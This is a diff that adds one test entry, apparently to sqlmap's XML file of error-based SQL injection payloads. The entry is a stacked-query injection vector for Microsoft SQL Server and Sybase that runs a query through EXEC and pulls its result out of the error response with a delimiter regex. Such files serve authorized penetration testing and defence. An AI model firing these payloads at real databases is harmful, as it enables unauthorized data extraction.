@@ -1298,4 +1298,27 @@
          and SAP MaxDB - no known techniques at this time
     -->
     <!-- End of error-based tests - ORDER BY, GROUP BY clause -->
+
+    <!-- Error-based tests - stacking -->
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - Stacking (EXEC)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]');EXEC @[RANDSTR]</vector>
+        <request>
+            <payload>;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]');EXEC @[RANDSTR]</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+    <!-- End of error-based tests - stacking -->
 </root>
